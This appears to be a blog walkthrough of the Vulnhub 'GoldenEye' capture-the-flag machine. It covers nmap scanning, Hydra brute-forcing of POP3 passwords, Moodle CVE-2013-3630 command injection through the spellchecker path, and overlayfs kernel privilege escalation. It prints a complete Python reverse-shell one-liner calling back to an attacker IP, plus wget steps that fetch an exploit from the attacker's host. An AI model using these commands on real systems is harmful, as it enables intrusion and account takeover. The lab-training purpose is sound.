---
layout: post
title: "Vulnhub - GoldenEye Walkthrough"
author: "joona"
---

![](/images/goldeneye/goldeneye-header.jpg)

[GoldenEye][GoldenEye] is a James Bond themed vulnerable machine created by [creosote][creosote].
It is ranked as intermediate level and more CTF-like than realistic.
<br/><br/>
## Enumeration
Let's start with an nmap scan.
> nmap -p- -A -T4 10.10.11.133 -oA nmap/goldeneye

`-p-` scan all ports

`-A` does OS detection (-O), version detection (-sV) and script scanning (-sC)

`-T4` set timing template higher to speed things up

`-oA` output in all formats

Looking at the results we have ports 25 (SMTP), 80 (HTTP) and 55007 (POP3) open.<br/>
Let's check the HTTP port first. We get a webpage with the following text:

>Severnaya Auxiliary Control Station<br/>
****TOP SECRET ACCESS****<br/>
Accessing Server Identity<br/>
Server Name:................<br/>
GOLDENEYE<br/><br/>
User: UNKNOWN<br/>
Navigate to /sev-home/ to login

If we try to navigate to 10.10.11.133/sev-home/ we get an authentication prompt.
Looking at the websites source code there's an interesting JavaScript file called `terminal.js`.
Inside that script there's a comment with Boris' password.<br/>
![](/images/goldeneye/terminaljs.jpg)<br/>

The password is HTML encoded, which you can decode with Burp Suite or any online HTML decoder.
It decodes to `InvincibleHack3r`.
Take note that user `Natalya` is also mentioned. We now have two users: Boris and Natalya.

Let's login to /sev-home/ with `Boris:InvincibleHack3r`. We get a webpage with a message that
hints to check pop3 service.<br/>
![](/images/goldeneye/sevhome.jpg)<br/>

The credentials we currently have does not work on pop3 login though.
We can try to brute-force the password with `Hydra`.
>hydra -l boris -P /usr/share/wordlists/fasttrack.txt 10.10.11.133 -s 55007 pop3 -V

`-l` username<br/>
`-P` password file<br/>
`-s` specify the port because it's not the default pop3 port<br/>
`-V` verbose, prints out every tried password<br/>

It took quite a few tries to find the correct password file, but we now have the password:<br/>
![](/images/goldeneye/hydrabob.jpg)<br/>

Lesson learned; don't just throw rockyou.txt at everything :)  

Before we start rummaging through Boris' private emails, let's start brute-forcing Natalya's pop3
password in the background.
>hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 10.10.11.133 -s 55007 pop3 -V

Connect to the pop3 server:
>nc 10.10.11.133 55007<br/>

pop3 commands:<br/>
`USER boris` login name<br/>
`PASS secret1!` password<br/>
`LIST` list messages


Print out an email with `RETR <message-number>` command.
>Email 1:<br/>
From: root@127.0.0.1.goldeneye<br/>
Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks
because I trust you and the other admins here.

>Email 2:<br/>
From: natalya@ubuntu<br/>
Boris, I can break your codes!

>Email 3:<br/>
From: alec@janus.boss<br/>
Boris,
Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!<br/><br/>
Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....<br/>
PS - Keep security tight or we will be compromised.

Nothing too interesting, but we do get new potential usernames: `Xenia`, and `alec`.

Behind the scenes we have also cracked Natalya's pop3 password:<br/>
![](/images/goldeneye/popnata.jpg)<br/>

>Email 1:<br/>
From: root@ubuntu<br/>
Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.<br/><br/>
Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.

>Email 2:<br/>
From: root@ubuntu<br/>
Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)<br/><br/>
Ok, user creds are:<br/>
username: xenia<br/>
password: RCP90rulez!<br/><br/>
Boris verified her as a valid contractor so just create the account ok?
And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....
Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.**

We have a username and a password to internal training website severnaya-station.com/gnocertdir.<br/>
If we just try navigating to 10.10.11.133/gnocertdir we get an error `Incorrect access detected.`
We need to point the server's IP to severnaya-station.com.<br/><br/>
This can be done by adding `10.10.11.133 severnaya-station.com` to the `/etc/hosts`-file.

Navigating to severnaya-station.com/gnocertdir we get a "GoldenEye Operators Training" Moodle platform.
After logging in as `Xenia` and enumerating the site we see that we have received a private message:<br/>
![](/images/goldeneye/xen.jpg)<br/>

A new username `doak` and a mention about emails. Let's give doak the good ol' Hydra-pop3 treatment:
>hydra -l doak -P /usr/share/wordlists/fasttrack.txt 10.10.11.133 -s 55007 pop3 -V

We manage to get the password `goat`.
>Email 1:<br/>
From: doak@ubuntu<br/>
James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?<br/>
Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......<br/><br/>
username: dr_doak<br/>
password: 4England!<br/>

Doak was expecting us to get into his email and he has hidden something on the training platform.
Logging in as him and navigating to his profile, there's a section called My private files.<br/>
![](/images/goldeneye/forjames.jpg)<br/>

>s3cret.txt:<br/>
007,<br/>
I was able to capture this apps adm1n cr3ds through clear txt.<br/>
Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.
Something juicy is located here: /dir007key/for-007.jpg

At 10.10.11.133/dir007key/for-007.jpg we have a picture of Dr. Doak:<br/>
![](/images/goldeneye/doakster.jpg)<br/>

The credentials are probably hidden inside this image, so let's do some CTF work.<br/>
First download the image with `wget 10.10.11.133/dir007key/for-007.jpg`.<br/>
Checking the image's EXIF-data with `exiftool for-007.jpg` we see an interesting string:<br/>
`Image Description: eFdpbnRlcjE5OTV4IQ==`

The strings is encoded with base64. Decoding it with `echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d` we get password: `xWinter1995x!`.
This is the admin password to the training platform.
<br/><br/>
## Reverse Shell

Enumerating the site as admin we find the Moodle version `2.2.3`.
If we Google exploits for this, we find a remote command execution vulnerability [CVE-2013-3630][CVE-2013-3630].
>By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spellchecking requests.

So if we change the path for spellchecker, let's say to and run it, we get a reverse shell.<br/>
Spellchecker path -setting is at **Home > Site administration > Server > System paths.**

Before we can exploit this we have to change the `Spell engine` from default "Google Spell" to "PSpellShell" at **Home > Site administration >
Plugins > Text editors > TinyMCE HTML editor**.

Now that we have the spellchecker path and spell engine changed we can set up a netcat listener on our host:
`nc -lvnp 1337`.<br/>
After that go to the training platform and create a new blogpost.
In the text-editor there is a button for spell-checking.
Click that and you should now have a reverse shell as user `www-data`.

I used the usual Python reverse shell as the spellchecker path:
>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.x.x.x",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

<br/><br/>
## Privilege Escalation
The machine has `wget` and `curl` so you could easily download an enumeration script.
But for this we only need to check the kernel version with `uname -a`.
>Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

This kernel version is vulnerable to `overlayfs` local privilege escalation ([CVE-2015-1328][CVE-2015-1328]).<br/>
Download the exploit to your machine. Edit the comments out and set up a simple Python HTTP server:
`python3 -m http.server`.<br/>
On the target machine let's move to the `/tmp` folder and download the exploit:<br/>
`wget your-ip:8000/ofs.c`.<br/>
Give execution permissions to the file `chmod +x ofs.c` and run it. We get an error: `gcc: not found`.
The exploit tries to compile the code with gcc, but gcc is not installed on the target machine.

Check for other compilers with `which cc` or `which g++`. `cc` seems to be installed so let's edit our exploit. <br/>
Call for **gcc** is on line 109:<br/>
`lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");`.<br/>
Switch it to use **cc**:<br/>
`lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");`.

Now we can run the exploit and we get a root shell.
The flag is inside the `/root` folder:
>Alec told me to place the codes here:<br/>
flag<br/>
If you captured this make sure to go here.....<br/>
/006-final/xvf7-flag/<br/>

![](/images/goldeneye/flag.jpg)<br/>

Thank you for reading :)

[CVE-2015-1328]: https://www.exploit-db.com/exploits/37292
[CVE-2013-3630]: https://www.exploit-db.com/exploits/29324
[GoldenEye]: https://www.vulnhub.com/entry/goldeneye-1,240/
[creosote]: https://www.vulnhub.com/author/creosote,584/
